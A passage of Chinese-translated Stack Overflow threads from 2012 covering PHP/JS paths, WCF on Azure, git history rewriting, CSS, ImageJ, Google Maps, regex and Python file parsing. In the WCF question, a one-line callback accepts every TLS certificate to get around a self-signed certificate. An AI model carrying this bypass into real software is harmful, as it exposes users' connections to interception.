```

在我的文档中呈现如下：

```
<script type="text/javascript" src="host/source/ArcJ.js"></script> 
```

如果我在前面加上`/`它会破坏链接。

在 PHP 中，对于服务器端路径，我使用：

```
<?php
    include_once getcwd() . "/host/source/class.ControlEntry.php"; 
```

如果我不放入`/`它会破坏事情。

我想从概念上讲，我怎么知道这一点，所以我不必反复试验？

还指出：

我的 .js 文件中的路径可以在路径之前使用 a`/`或不使用 a `/`。

这些用于图像查找或 ajax 调用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T18:47:15.680

您应该知道，您传递给的路径`include_once`是在服务器本身上解析的，而 Javascript 中的路径是由浏览器解析的。两者基本上遵循相同的规则：

*   以开头的路径`/`是绝对解决的。在服务器上，这是根目录（即最顶层的目录）。在浏览器中，这基本上是连接主机和您指定的路径。
*   不以 a 开头的路径`/`是相对解析的，即针对服务器上的当前目录和浏览器中的路径。

意识到`getcwd()`返回一个像`/var/www`. 如果你只是连接`host/source/class.ControlEntry.php`到它，它将产生`/var/wwwhost/source/class.ControlEntry.php`. 在大多数（如果不是，全部）PHP SAPI 上，您可以在包含文件时省略该`getcwd()`内容，因为在包含文件时已经在搜索当前目录。在这种情况下，您也不需要`/`。

最后，**服务器文件路径不必与 URL 匹配**！`http://example.com/script.php`可以位于`/var/www/script.js`。如果您在 HTML 文件中引用`/script.php`，它将被正确解析。另一方面，您不应该尝试`include "/script.php"`，这将在您的文件系统的根目录中搜索一个文件`script.php`，而这通常不是您要查找的文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T18:48:08.610

前面的斜杠用于表示路径应被视为绝对路径，这意味着，

1.  对于您的 Js 路径，它驻留在浏览器解析以呈现其内容的 HTML 文件中，它应该将您写入的内容附加到域以获取文件。如果您的 Js 文件相对于您的代码段所在的当前页面，则链接可能会中断。
2.  对于您的 php 文件，它位于可以通过以下系统根目录访问的路径中`host/source/class.ControlEntry.php`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T18:46:49.400

您知道文件所在的位置。使用它们的相对或绝对路径，它适用于 PHP 和 JavaScript。

在您的示例中，前面的`/`内容将使路径指向其他地方，从而破坏应用程序。在您的 PHP 示例中，您特别连接了路径字符串 - 这将取决于`getcwd()`.

# c++ - 需要容器，从一开始就知道键但值不知道

> ID：10676111
> 
> 赞同：1
> 
> 时间：2012-05-20T18:41:11.737
> 
> 标签：c++, containers

我想使用像无序地图这样的容器，但我有两个特殊要求......

*   我从一开始就知道所有的键都可以，所以我想先输入所有没有值的键。
*   输入键后，程序继续，我想知道哪个值已经被填充，**但不是像'0'等常量值，而不是指针。**

谢谢，对我糟糕的英语感到抱歉

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T18:44:53.130

```
std::unordered_map<key_type,boost::optional<value_type>> 
```

[http://www.boost.org/doc/libs/1_49_0/libs/optional/doc/html/index.html](http://www.boost.org/doc/libs/1_49_0/libs/optional/doc/html/index.html)

# wcf - 无法使用 https 调用托管在 Azure 中的 WCF 服务的方法

> ID：10676114
> 
> 赞同：2
> 
> 时间：2012-05-20T18:41:40.990
> 
> 标签：wcf, https, azure

我有一个托管在 Azure 中的 WCF 服务，我能够正确获取 wsdl，但是当尝试调用一个方法时，它给了我以下错误。

> 在 [https://pactwp7.cloudapp.net/Service1.svc](https://pactwp7.cloudapp.net/Service1.svc)上没有可以接受消息的端点监听。这通常是由不正确的地址或 SOAP 操作引起的。有关更多详细信息，请参阅 InnerException（如果存在）。

我在制作 https 时使用了自签名证书，因此在从客户端访问服务之前添加了以下内容： `ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, error) => true;`

以下是我使用的服务配置：

```
<system.serviceModel>
<behaviors>
  <serviceBehaviors>        
    <behavior name="httpsAzureBehavior">
      <serviceMetadata httpsGetEnabled="true" />
      <serviceDebug includeExceptionDetailInFaults="true" />
      <useRequestHeadersForMetadataAddress>
        <defaultPorts>
          <add scheme="http" port="80" />
          <add scheme="https" port="443" />
        </defaultPorts>
      </useRequestHeadersForMetadataAddress>
    </behavior>
  </serviceBehaviors>
</behaviors>
<bindings>
  <customBinding>
    <binding name="httpsBinding">
      <binaryMessageEncoding />
      <httpsTransport allowCookies="true" />
    </binding>
  </customBinding>
</bindings>
<serviceHostingEnvironment multipleSiteBindingsEnabled="true" 
                           aspNetCompatibilityEnabled="true" />
<services>
  <service behaviorConfiguration="httpsAzureBehavior" 
           name="PactServices.ServiceImplementation.PactService">
    <endpoint address="" binding="customBinding" 
                         bindingConfiguration="httpsBinding"
                         contract="PactServices.ServiceContracts.IPactServices" 
                         listenUri="Service1.svc" />
    <endpoint address="mex" binding="mexHttpBinding" 
              contract="IMetadataExchange" />
  </service>
</services> 
```

有什么理由吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T02:58:22.700

您是否在 CSDEF 文件上打开了 443 输入端点？

RDP 到您的 VM 并进行本地尝试可能有助于识别和调试我认为。

# javascript - 如何在下拉字段的 X 位置获取值？

> ID：10676125
> 
> 赞同：1
> 
> 时间：2012-05-20T18:42:43.257
> 
> 标签：javascript, drop-down-menu

如果我有一个如下所示的下拉列表：

```
<select id="select">
<option value="Armoire">Armoire</option>
<option value="Bridge Bed">Brigde Bed</option>
<option value="Bunk Bed">Bunk Bed</option>
</select> 
```

是否可以在特定位置获得价值？例如：

```
var b=select.getValueAt(1); 
```

这样 b 就等于“桥床”。这将是常规 java 代码的正确行。无论如何使用javascript来做到这一点？

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:48:25.990

选择元素有一个名为 options 的属性，它是它包含的所有选项标签的数组
要获取索引处元素的值，请使用

```
var b = document.getElementById('select').options[1].value 
```

[选择对象](http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-94282980)
[小提琴](http://jsfiddle.net/mowglisanu/r2WwK/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T18:52:59.800

假设您已经设法以`<select>`某种方式获取元素：

```
var idx = 1;
var selectTag = document.getElementById('select');
var b = selectTag.getElementsByTagName("option")[idx].getAttribute("value"); 
```

这使用适当的 DOM 方法来完成这项工作，并将获取所有子`<option>`标签，包括`<optgroup>`. 索引忽略`<optgroup>`并索引从 0 开始的所有`<option>`标签。一个例子（它`alert`的值）是[here](http://ibboard.co.uk/temp/option-index.html)

# javascript - 需要一个仅移动溢出文本框而无需滚动浏览器的锚链接

> ID：10676126
> 
> 赞同：0
> 
> 时间：2012-05-20T18:42:43.400
> 
> 标签：javascript, html, scroll, overflow, anchor

我试图找出一种方法来单击页面顶部的锚链接模板，而无需让浏览器滚动到我的锚点。

听起来多余吧？

等待。

我的锚链接在溢出内：单击页面顶部的锚链接的隐藏文本框应该只会在显示其内容的溢出文本框中提升锚点，就像拥有一个新网页一样。从布局的角度来看，浏览器必须始终位于表单所在页面的顶部。

有人有线索吗？谢谢

更新：：：

哦，很快就谈到了，看起来 Css 和 Javascript - Show and Hide 方法会更合适。在这里找到：[http ://webdesign.about.com/od/dhtml/a/aa101507.htm](http://webdesign.about.com/od/dhtml/a/aa101507.htm)

感谢互联网！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:08:30.763

这样做很容易。您要做的是让父 div/view 充当主 div，并且所有其他 div/view 将在其中动态加载或卸载，或者作为其子级加载或卸载。最好采用“MVC”之类的设计模式，但可以直接通过 JQuery 完成。如果我要解决这样的问题，我将有一个“导航视图”，然后是内容视图，因此当用户单击所需的导航链接时，将加载或滚动该特定视图。（当然，您需要进行实验并根据内容视图的需要排列您的深度）。

这就是 Flash 的编程方式。这是一个非常高级的解释，我希望它能给你一些关于如何开始的想法。

# git - 从 git 历史记录中删除已删除的文件

> ID：10676128
> 
> 赞同：42
> 
> 时间：2012-05-20T18:42:48.670
> 
> 标签：git, version-control, git-filter-branch

我正在尝试从我的 git 存储库中拆分一个子项目。然而，与 [分离（移动）子目录到单独的 Git 存储库](https://stackoverflow.com/questions/359424/detach-subdirectory-into-separate-git-repository)不同， 我没有将它放在它自己的子目录中（移动它并执行上述操作只会在移动后产生历史记录）。

我已经将要从中拆分子项目的分支克隆到它自己的存储库中，并删除了子项目未使用的所有内容，因此基本上我可以将其用作子项目的存储库。

现在我想摆脱所有不再在此存储库中的文件的历史记录，以便只保留使其成为后代的文件的文件历史记录。

我认为 git-filter-branch 一定是可能的，但我不知道怎么做

提前谢谢了

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-20T22:57:53.543

[这里有一些说明来做你想做的事。](http://help.github.com/remove-sensitive-data/)

这将删除`file_to_remove`：

```
git filter-branch --index-filter 'git rm --cached --ignore-unmatch file_to_remove' --prune-empty -- --all 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-22T19:01:20.427

好的，现在我正在尝试使用以下技术，如果它有效，将报告它，因为它似乎运行了很长时间： On a zsh or bash ON A CLONED Repository

```
git log --diff-filter=D --summary <start_commit>..HEAD | egrep -o '*[[:alnum:]]*(/[[:alnum:].]*)+$' > deleted.txt 
```

获取所有已删除的文件

```
for del in `cat deleted.txt`
do
    git filter-branch --index-filter "git rm --cached --ignore-unmatch $del" --prune-empty -- --all
    # The following seems to be necessary every time
    # because otherwise git won't overwrite refs/original
    git reset --hard
    git for-each-ref --format="%(refname)" refs/original/ | xargs -n 1 git update-ref -d
    git reflog expire --expire=now --all
    git gc --aggressive --prune=now
done; 
```

这可能对您的数据非常危险，因此只能尝试克隆。

# css - 下拉菜单 (display:none) 在不使用时阻止单击位于其空间中的其他 div - 我可以单击吗？

> ID：10676129
> 
> 赞同：0
> 
> 时间：2012-05-20T18:42:54.157
> 
> 标签：css, pointers, html, drop-down-menu, click

我有一些下拉菜单显示：无，仅在单击时显示（使用 jquery）。但是，有些 div 被放置在下拉菜单“下方”的位置。考虑到下拉菜单在出现时必须超越所有内容，它们必须位于下方。但是，我能做些什么来“点击”这些下拉 div 吗？

我知道有“指针事件：无”但这似乎会禁用所有点击下拉菜单，这是我不能拥有的。

我见过 100 多个网站，其下拉菜单涵盖了其网站的整个部分。但是，当不使用时，这些菜单不会阻止位于“下方”的 div，那么这里的解决方案是什么？

我需要通过下拉菜单的定位来解决什么问题吗？

任何和所有的帮助表示赞赏。我花了很长时间才发现问题。我很困惑为什么我的 div 不能点击！然后我做了“clear:both”，它向下移动，最后意识到隐藏的 div 挡住了路。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:45:06.133

似乎您正在使用`opacity: 0`这些下拉 div，这使它们保持原位，并阻止鼠标事件在下面的元素上触发。

您应该使用以下方式以不同方式隐藏它们：

1.  使用`visibility: hidden`或`display: none`（如果您还想对屏幕阅读器隐藏它）

2.  通过使用巨大的负偏移（例如`-999em`），将它们绝对定位在可见视口之外。
    这将确定它们仍然可以被屏幕阅读器阅读。

或者，您可以与它的可见性一起切换`pointer-events:none`，但旧 IE 不支持`pointer-events`.

# actionscript-3 - 闪存中的 XFL（未压缩）文件有什么用？

> ID：10676131
> 
> 赞同：2
> 
> 时间：2012-05-20T18:43:19.190
> 
> 标签：actionscript-3, flash

我注意到有些时候 "Save AS.." ，它说 "XFL file" "Uncompressed flash file" 。它有什么用？为什么我需要它而不是 FLA ？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-20T18:52:47.900

它是新的文件格式。它只不过是一个包含一个或多个 xmls 和东西的文件夹。*.fla 项目文件的主要问题是存在二进制文件。很难将 svn 或 git 等版本工具与二进制文件一起使用。当一切都在 ascii 中时，可以合并来自两个不同树的更改。当您使用 fla 并且遇到合并冲突时，您必须手动解决冲突。

# java - 如何将 ImageJ 用作单独 Java 应用程序的库？

> ID：10676136
> 
> 赞同：14
> 
> 时间：2012-05-20T18:43:55.557
> 
> 标签：java, image-processing, imagej

在常规的 Java 应用程序中，我有一个 BufferedImage，我想用 ImageJ 操作它。我有一个正是我需要执行的宏。我怀疑第一步是创建一个 ImagePlus 对象，但我不确定如何从 Java 中在 ImagePlus 对象上运行宏。[在这里](http://www.imagingbook.com/fileadmin/goodies/ijtutorial/tutorial171.pdf)找到的 ImageJ 教程的第 7.3 节说：

> 如果您决定使用 ImagePlus 作为内部图像格式，您还可以使用 ImageJ 发行版中的所有插件和宏以及所有其他 ImageJ 插件。

但并未说明如何操作。如果有人可以解释如何，或者将我指向一个资源，我将非常感激。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-20T22:29:01.163

以下站点通过示例描述了 ImageJ API：http: [//albert.rierol.net/imagej_programming_tutorials.html#ImageJ](http://albert.rierol.net/imagej_programming_tutorials.html#ImageJ)编程基础

这些示例包括读取图像、处理像素等。好吧，我想您还需要大量使用[API 文档](http://rsbweb.nih.gov/ij/developer/api/index.html)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-10-16T18:15:06.597

Here is a sample code that opens an image, inverts it and saves it back:

```
import ij.ImagePlus;
import ij.io.FileSaver;
import ij.process.ImageProcessor;

ImagePlus imgPlus = new ImagePlus("path-to-sample.jpg");
ImageProcessor imgProcessor = imgPlus.getProcessor();
imgProcessor.invert();
FileSaver fs = new FileSaver(imgPlus);
fs.saveAsJpeg("path-to-inverted.jpg"); 
```

And here's a sample code that shows how to manipulate an image to make it grayscale:

```
BufferedImage bufferedImage = imgProcessor.getBufferedImage();
for(int y=0;y<bufferedImage.getHeight();y++)
{
    for(int x=0;x<bufferedImage.getWidth();x++)
    {
        Color color = new Color(bufferedImage.getRGB(x, y));
        int grayLevel = (color.getRed() + color.getGreen() + color.getBlue()) / 3;
        int r = grayLevel;
        int g = grayLevel;
        int b = grayLevel;
        int rgb = (r<<16)  | (g<<8)  | b;
        bufferedImage.setRGB(x, y, rgb);
    }
}
ImagePlus grayImg = new ImagePlus("gray", bufferedImage);
fs = new FileSaver(grayImg);
fs.saveAsJpeg("path-to-gray.jpg"); 
```

I hope it helps you get started :)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-22T02:43:54.570

这是一个使用 imagej 的开源项目实现，用于照片共享网络应用程序。

将此作为参考在您的应用程序中实现 imagej api

[http://www.gingercart.com/Home/java-snippets/create-image-thumbnail-in-java-using-imagej-api](http://www.gingercart.com/Home/java-snippets/create-image-thumbnail-in-java-using-imagej-api)

# c# - 如何消除 URL 的第一部分

> ID：10676139
> 
> 赞同：0
> 
> 时间：2012-05-20T18:44:23.160
> 
> 标签：c#, asp.net, url

我的 .cs 文件中基本上有一个属性

```
public string MyURL
{
    get { return _myUrl; }
    set { _myURL = value; }
} 
```

该属性以字符串形式获取值，它会是这样的`www.shipco.com`。

我遇到的问题是，当我将它作为带有目标空白的锚点放入页面时，它会将其作为网站中的一个位置，例如`http://mywebsite/www.shipco.com`

这就是我在页面上设置它的方式：

```
 <div>
 <strong>URL :</strong> 
          <a href="<%=MyURL%>" target="_blank"><%=MyURL%></a>  
    </div> 
```

我会很感激任何帮助，因为我正在学习并且不确定如何实现这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T18:46:43.140

浏览器中完全限定 URL 和相对 URL 的基础知识：

```
<a href="www.shipco.com" target="_blank">www.shipco.com</a> 
```

上面的意思是，转到当前 URL，只用`href`. 您将看到页面的来源正是您所期望的。浏览器将其解释为与当前页面的相对位置——它不“知道”它是一个不同的网站。

您还需要输出`http://`：

```
<a href="http://<%=MyURL%>" target="_blank"><%=MyURL%></a> 
```

也许[这篇](http://webdesign.about.com/od/beginningtutorials/a/aa040502a.htm)关于.com 的文章会有所启发。

# javascript - 谷歌地图 V3 自定义标记图像和 fitBounds()

> ID：10676140
> 
> 赞同：1
> 
> 时间：2012-05-20T18:44:29.417
> 
> 标签：javascript, google-maps, google-maps-api-3

在我使用 fitBounds() 方法将地图的边界拟合到标记本身之后，我试图让我的自定义标记显示在我的地图上。

我通过循环标记数组然后扩展地图的边界以合并标记坐标来完成此操作。

这适用于库存谷歌地图标记。但是，我的客户希望为他们的网站使用相当大的（36 像素 x 57 像素）标记图像。在拟合地图的边界时如何弥补这一点？

目前使用自定义标记图像时，它们并不都适合设置的边界。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:07:17.713

由于您已经计算了边界，您可能只需要扩展边界以添加足够的缓冲区来包含大图像。可以用这种方式计算或扩展边界的公式称为凸包。计算[几何算法库](http://www.cgal.org/)有一个关于[2D Convex Hull 算法](http://www.cgal.org/Manual/latest/doc_html/cgal_manual/packages.html#Part%3aConvexHullAlgorithms)的部分，或者有一个[JavaScript Quickhull 文章](http://en.literateprograms.org/Quickhull_%28Javascript%29)，在页面底部附近还包括一个漂亮的在线示例。希望这会有所帮助-

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:49:18.887

便宜的答案是总是在 fitBounds() 之后缩小一级。但我们可以做得更好一点。

我喜欢写黑客。在这里，我假设标记的大小永远不会大于 36x57。我测试了一段时间，发现`fitBounds()`边缘和最近的标记之间留有大约 42 px 的边距（可能不在手机上），而且我还假设您没有重新定位标记，也就是说，它将始终显示在给定的坐标位置之上。如果图标跑到另一边，则需要进行调整。

我的 hack 利用了一个测量 LatLng 像素位置的函数（使用容器版本，我在这里读到 div 版本在边界变化时不可靠）。

因为我们知道图标的高度以及最上面的标记在哪里，所以如果确定地图不在屏幕上，我们可以将地图向南平移一点。如果下面没有足够的边距，唯一的选择是缩小。我唯一担心的是它会很生涩，因为它需要两个事件：fitBounds 和自定义平移/缩放。那么唯一的答案就是重写一个自定义的fitBounds。当我手动测试时，事件运行顺利。

[http://jsfiddle.net/sZJjY/](http://jsfiddle.net/sZJjY/)

单击添加猫图标，右键单击触发调整大小/平移。

示例：放置 3-4 只小猫，单击鼠标右键，然后故意放置另一个从顶部脱落的小猫，再次单击鼠标右键。

```
 function fitIcons() {
    var left = 180.0;
    var right = -180.0;
    var top = -90.0;
    var bottom = 90.0;

    for (var i = 0; i < markers.length; i++) {
      curlat = markers[i].getPosition().lat();
      curlng = markers[i].getPosition().lng();
      if(curlat > top)    { top = curlat; }
      if(curlat < bottom) { bottom = curlat; }
      if(curlng > right)  { right = curlng; }
      if(curlng < left)   { left = curlng; }
    }

    var overlay = new google.maps.OverlayView();
    overlay.draw = function() {};
    overlay.setMap(map);

    map.fitBounds(new google.maps.LatLngBounds(
      new google.maps.LatLng(bottom, left),
      new google.maps.LatLng(top, right)));

    topPixels = overlay.getProjection().fromLatLngToContainerPixel(
                  new google.maps.LatLng(top, right));

    bottomPixels = overlay.getProjection().fromLatLngToContainerPixel(
                  new google.maps.LatLng(bottom, left));

    topGap = topPixels.y;
    bottomGap = $("#map_canvas").height() - bottomPixels.y;

    if(topGap < iconHeight) {
      if(bottomGap > iconHeight) {
        map.panBy(0, topGap);
      }
      else {
        map.setZoom(map.getZoom() - 1);
      }
    }
  } 
```

# php - 访问对象内数组元素的方法

> ID：10676142
> 
> 赞同：0
> 
> 时间：2012-05-20T18:44:43.337
> 
> 标签：php, class, properties, reference

我正在尝试将我们现有的代码库转换为更正确的方法。我们现有的代码库是用 HTML 编写的，到处都插入了 PHP 和 Javascript 代码（不是以无序的方式，但不应该是这样）。

所以我正在转换我们当前的代码库以使用类，所以属性和方法是继续的方式。但我有一个问题。我（理想情况下）想通过他们的名字而不是索引来引用我的班级成员之一。让我把它放在一个代码示例中。

这是表单类：

```
class form {
    public $name;
    public $fields;

    {constructor goes here...}

    public function addField($type, $name, $hint = null, $info = null) {
        $this->fields[] = new field($type, $name, $hint, $info);
    }
} 
```

这是字段类（表单类在创建新表单字段时调用）：

```
class field {
    public $name;
    public $type;
    public $values;

    public function __construct($name) {
        $this->name = $name;
        $this->fields = null;
    }

    public function addValue($value, $minimum = null, $maximum = null, $step = 1) {
        $this->values[] = new value($value, $minimum, $maximum, $step);
    }
} 
```

所以我的代码看起来像这样：

```
$form = new form("form1");
$form->addField(NUMBER, "number1");
$form->fields[0]->addValue(25, 1, 250, 1); 
```

它确实有效，但最终不是我想要的。我想用指定的名称来调用每个字段，所以我可以这样写：

```
$form = new form("form1");
$form->addField(NUMBER, "number1");
$form->fields['number1']->addValue(25, 1, 250, 1); 
```

甚至：

```
$form->addField(NUMBER, "number1")->addValue(25, 1, 250, 1); 
```

可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:49:03.260

看起来这些字段只是表单对象中的一个数组。所以而不是

```
 $this->fields[] = new field($type, $name, $hint, $info); 
```

你能做到这一点吗？

```
 $this->fields[$name] = new field($type, $name, $hint, $info); 
```

# regex - URL 重写正则表达式以允许字母数字下划线和连字符

> ID：10676149
> 
> 赞同：1
> 
> 时间：2012-05-20T18:45:40.123
> 
> 标签：regex, url-rewriting

我目前有正则表达式允许下划线如何添加连字符？

这是我目前所拥有的。

```
^(\w+)[/]*$ 
```

我认为 *$ 等于下划线？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T18:52:27.083

您可以使用此正则表达式：

```
^([\w-]+)/*$ 
```

并且下划线存在，因为`\w`这意味着包含所有字母、所有数字和下划线的单词字符。

# ios - 核心图形模式崩溃（仅在设备上）

> ID：10676151
> 
> 赞同：1
> 
> 时间：2012-05-20T18:45:58.917
> 
> 标签：ios, core-graphics, design-patterns, quartz-2d

我有一个在模拟器上完美运行的核心图形模式，但它在设备上崩溃：

```
void MyDrawColoredPattern4 (void *info, CGContextRef context) {
   UIColor* colorClar = [UIColor colorWithRed: 0.57 green: 0.57 blue: 0.57 alpha: 1];
   UIColor* colorFosc = [UIColor colorWithRed: 0.15 green: 0.15 blue: 0.15 alpha: 1];

   CGColorRef dotColor = colorFosc.CGColor;
   CGColorRef shadowColor = colorClar.CGColor;

   CGContextMoveToPoint(context, 5, -0.5);
   CGContextAddLineToPoint(context, 1.1, 1.75);
   CGContextAddLineToPoint(context,1.1, 6.25);
   CGContextAddLineToPoint(context,5, 8.5);
   CGContextAddLineToPoint(context,8.9, 6.25);
   CGContextAddLineToPoint(context,8.9, 1.75);
   CGContextClosePath(context);

   CGContextMoveToPoint(context,16, 10.5);
   CGContextAddLineToPoint(context, 12.1, 12.75);
   CGContextAddLineToPoint(context,12.1, 17.25);
   CGContextAddLineToPoint(context,16, 19.5);
   CGContextAddLineToPoint(context,19.9, 17.25);
   CGContextAddLineToPoint(context,19.9, 12.75);
   CGContextClosePath(context);

   CGContextSetFillColorWithColor(context, dotColor);
   CGContextSetShadowWithColor(context, CGSizeMake(1, 1), 2, shadowColor);

   CGContextFillPath (context);
} 
```

图案大小为 25*25，用 . 填充整个矩形`drawRect`。我知道有时具有高要求的图形应用程序往往会在设备上崩溃而没有模拟器，但我不确定是否是这种情况。

我创建了一些更简单的模式，它们在模拟器和设备中都可以正常工作。

任何人？

**编辑**：顺便说一句，控制台上除了编辑器区域中的以下内容之外什么都没有：

```
libobjc.A.dylib`objc_msgSend:
0x37be7f68:  teq.w  r0, #0
0x37be7f6c:  beq    0x37be7faa               ; objc_msgSend + 66
0x37be7f6e:  push.w {r3, r4}
0x37be7f72:  ldr    r4, [r0]
0x37be7f74:  lsr.w  r9, r1, #2
0x37be7f78:  ldr    r3, [r4, #8]      ------------------> this line is highligthed in green.
0x37be7f7a:  add.w  r3, r3, #8
0x37be7f7e:  ldr    r12, [r3, #-8]
0x37be7f82:  and.w  r9, r9, r12
0x37be7f86:  ldr.w  r4, [r3, r9, lsl #2]
0x37be7f8a:  teq.w  r4, #0
0x37be7f8e:  add.w  r9, r9, #1
0x37be7f92:  beq    0x37be7fa6               ; objc_msgSend + 62
0x37be7f94:  ldr.w  r12, [r4]
0x37be7f98:  teq.w  r1, r12
0x37be7f9c:  bne    0x37be817e               ; objc_msgSendSuper_stret + 34
0x37be7f9e:  ldr.w  r12, [r4, #8]
0x37be7fa2:  pop    {r3, r4}
0x37be7fa4:  bx     r12
0x37be7fa6:  pop    {r3, r4}
0x37be7fa8:  b      0x37be7fb0               ; objc_msgSend_uncached
0x37be7faa:  mov.w  r1, #0
0x37be7fae:  bx     lr 
```

# vb.net - 进度条改变颜色

> ID：10676153
> 
> 赞同：0
> 
> 时间：2012-05-20T18:46:31.583
> 
> 标签：vb.net, progress-bar

我正在尝试更改自定义控件的进度条颜色。我尝试了很多方法，例如使用下面的发送消息功能：

> ```
> <DllImport("User32.Dll")> _
> Public Shared Function SendMessage(hwnd As Integer, wMsg As Integer, wParam As Integer, lParam As Integer) As Integer
> End Function 
> ```

```
Public Const PBM_SETBKCOLOR As Integer = &H2001
Public Const PBM_SETBARCOLOR As Integer = &H409

Public Sub SetProgressBackColor(c As Color)

    Dim a As Integer = Convert.ToInt32(c.R.ToString())
    Dim b As Integer = Convert.ToInt32(c.G.ToString())
    Dim d As Integer = Convert.ToInt32(c.B.ToString())
    Dim tot As Integer = Convert.ToInt32(ColorTranslator.ToOle(Color.FromArgb(a, b, d)).ToString())
    Dim j As Integer = Me.PercentFull.Handle.ToInt32()
    SendMessage(j, PBM_SETBKCOLOR, 0, tot)
End Sub

Public Sub SetProgressForeColor(c As Color)

    Dim a As Integer = Convert.ToInt32(c.R.ToString())
    Dim b As Integer = Convert.ToInt32(c.G.ToString())
    Dim d As Integer = Convert.ToInt32(c.B.ToString())
    Dim tot As Integer = Convert.ToInt32(ColorTranslator.ToOle(Color.FromArgb(a, b, d)).ToString())
    Dim j As Integer = Me.PercentFull.Handle.ToInt32()
    SendMessage(j, PBM_SETBARCOLOR, 0, tot)
End Sub 
```

但这对我不起作用，我看不到任何变化。

我更改此控件的前景色的最佳方法是什么？我不能使用 PercentFull.ForeColor，因为我将启用 xp 样式。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:50:25.930

`BackColor`只是发送此消息。
正如文件所述，

> 启用视觉样式后，此消息无效。

你不能做这个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T11:48:56.543

在 CodeProject，[http](http://www.codeproject.com/Articles/9635/A-Smooth-ProgressBar-for-everyone-Part-Duex) ://www.codeproject.com/Articles/9635/A-Smooth-ProgressBar-for-everyone-Part-Duex 上，Stumpy 创建了一个 SmoothProgressBar，允许您创建具有可变颜色的进度条。一探究竟。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-22T08:49:47.320

感谢您的帮助，但我决定使用以下内容：

> SendMessage(PercentFull.Handle, &H400 + 16, &H2, 0) '错误; 红色
> SendMessage(PercentFull.Handle, &H400 + 16, &H3, 0) '暂停；黄色
> SendMessage(PercentFull.Handle, &H400 + 16, &H1, 0) '暂停；绿色

# c# - 计算某个类的对象被实例化的次数

> ID：10676155
> 
> 赞同：2
> 
> 时间：2012-05-20T18:46:42.160
> 
> 标签：c#, class, xna, counter

我有一个名为 Button 的类，它创建要在屏幕上显示的按钮。我想为每个按钮创建一个信息数组，但需要知道创建了多少个按钮。有没有一种简单的方法来跟踪一个类被实例化了多少次？我已经尝试过了，但它似乎不起作用......我想如果你把计数器放在构造函数中，它每次都会添加一个，但它似乎不起作用。

```
private int children = 0;

public Button(Vector2 position, Vector2 fontPos, Color buttonColor, 
              String buttonText, Boolean clickable, String spriteName)
{
    this.position = position;
    this.buttonColor = buttonColor;
    this.buttonText = buttonText;
    this.clickable = clickable;
    this.spriteName += spriteName;
    this.fontPos = fontPos;
    children++;
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T18:48:19.173

让它成为静态的

```
private static int children = 0; 
```

# python - 导入 500GB 文本文件的最快方法只取想要的部分

> ID：10676170
> 
> 赞同：6
> 
> 时间：2012-05-20T18:48:20.517
> 
> 标签：python, text, replace

几个月内我有大约 500GB 的文本文件。在这些文本文件中，前 43 行只是连接信息（不需要）。接下来的 75 行是观察的描述符。接下来是 4 行（不需要），然后是下一个观察值，即 75 行。

我想要的只是这 75 行（每次观察的描述符都在同一个位置），其特征如下：

```
ID: 5523
Date: 20052012
Mixed: <Null>
.
. 
```

我想`5523;20052012;;..`为每个观察将其更改为 csv 格式。所以我最终得到的文本文件要小得多。由于描述符是相同的，我会知道例如第一个位置是 ID。

完成文本文件后，我将打开下一个文件并附加它（或者创建一个新文件会更快吗？）。

我所做的工作效率很低，我一直在打开文件。加载它。逐行删除这些观察结果。如果它对测试样本有相当大的影响，那么它显然不是最好的方法。

任何建议都会很棒。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T19:06:08.487

你说你有“大约 500GB 的文本文件”。如果我理解正确，则每次观察都没有固定的长度（注意，我不是在谈论*行*数，我指的是观察的所有行的总长度，以字节为单位）。这意味着您*将*不得不浏览整个文件，因为您无法确切知道换行符的位置。

现在，根据每个单独的文本文件的大小，您可能需要寻找不同的答案。但是如果每个文件都足够小（小于 1 GB？），您也许可以使用该[`linecache`](http://docs.python.org/library/linecache.html)模块，它会为您处理逐行查找。

您可能会像这样使用它：

```
import linecache

filename = 'observations1.txt'

# Start at 44th line
curline = 44
lines = []

# Keep looping until no return string is found
# getline() never throws errors, but returns an empty string ''
# if the line wasn't found (if the line was actually empty, it would have
# returned the newline character '\n')
while linecache.getline(filename, curline):
    for i in xrange(75):
        lines.append(linecache.getline(filename, curline).rstrip())
        curline += 1

    # Perform work with the set of observation lines
    add_to_observation_log(lines)

    # Skip the unnecessary section and reset the lines list
    curline += 4
    lines = [] 
```

我对此进行了测试，它在五秒钟内浏览了一个 23MB 的文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:17:48.620

> 打开文件。加载它。逐行删除这些观察结果。

“加载它”是什么意思？如果你的意思是把整个东西读成一个字符串，那么是的，这会很糟糕。处理文件的自然方法是利用文件对象是文件行上的迭代器这一事实：

```
for line in file:
    if should_use(line): do_something_with(line) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T19:46:17.287

